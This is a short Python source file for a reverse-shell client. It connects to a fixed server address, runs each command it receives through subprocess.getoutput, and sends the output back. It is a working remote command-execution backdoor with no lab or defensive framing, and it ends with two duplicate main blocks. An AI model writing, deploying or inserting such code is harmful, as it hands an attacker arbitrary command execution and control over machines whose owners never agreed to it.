import socket
import subprocess

from server import start_server

def start_client(server_ip, server_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        client.connect((server_ip, server_port))
        print("[+] Connected to server.")
    except:
        print("[!] Connection failed.")
        return

    while True:
        try:
            data = client.recv(4096)
            if not data:
                break

            command = data.decode("utf-8", errors="ignore")

            # execute the command
            try:
                output = subprocess.getoutput(command)
                client.send(output.encode())
            except Exception as e:
                client.send(f"Error: {e}".encode())

        except Exception as e:
            print(f"[!] Error: {e}")
            break

    client.close()


if __name__ == "__main__":
    SERVER_IP = "127.0.0.1"
    SERVER_PORT = 8888
    start_client(SERVER_IP, SERVER_PORT)

if __name__ == "__main__":
    start_server()